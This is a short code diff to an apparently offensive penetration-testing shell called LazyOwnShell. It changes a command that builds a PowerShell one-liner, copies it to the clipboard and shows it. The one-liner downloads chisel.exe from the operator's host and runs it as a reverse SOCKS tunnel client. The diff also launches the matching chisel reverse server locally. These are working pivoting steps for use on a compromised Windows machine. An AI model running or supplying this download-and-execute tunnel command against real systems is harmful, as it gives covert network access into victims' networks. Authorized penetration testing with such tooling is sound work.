@@ -1886,12 +1886,14 @@ class LazyOwnShell(Cmd):
 
         if len(args) == 1:
             lport = args[0]
-
             print_msg(f'Running {YELLOW}./sessions/chisel_1.9.1_linux_amd64 server -p {lport} --reverse -v {RESET} and copied .\chisel.exe client -v {lhost}:{lport} R:127.0.0.1:socks  to clipboard :D')
-            command = f"""iwr -uri http://{lhost}/chisel.exe -OutFile chisel.exe ; .\\chisel.exe client -v {lhost}:{lport} R:127.0.0.1:socks """
+            command = f"""iwr -uri http://{lhost}/chisel.exe -OutFile chisel.exe ;"""
+            command += ' .\\\\'
+            command +=  f"""chisel.exe client -v {lhost}:{lport} R:127.0.0.1:socks"""
+            cmdd = f"echo '{command}' | xclip -sel clip"
             print_msg(f"{MAGENTA}Command to copy: {GREEN}{command}{RESET}")
             os.system(cmdd)
-            os.system(f"cd sessions && gunzip -c chisel_1.9.1_linux_amd64.gz > chisel_1.9.1_linux_amd64 && gunzip -c chisel_1.9.1_windows_amd64.gz > chisel.exe  && chmod +x chisel* && ./chisel_1.9.1_linux_amd64 server --reverse -p {lport} -v")
+            os.system(f"cd sessions && gunzip -c chisel_1.9.1_linux_amd64.gz > chisel_1.9.1_linux_amd64 && gunzip -c chisel_1.9.1_windows_amd64.gz > chisel.exe  && chmod +x chisel* && ./chisel_1.9.1_linux_amd64 server --reverse -p {lport} --socks5 -v")
             print_msg(f"Shutdown chisel tunnel at sessions in port {RED} {line} {RESET}")
 
         else:
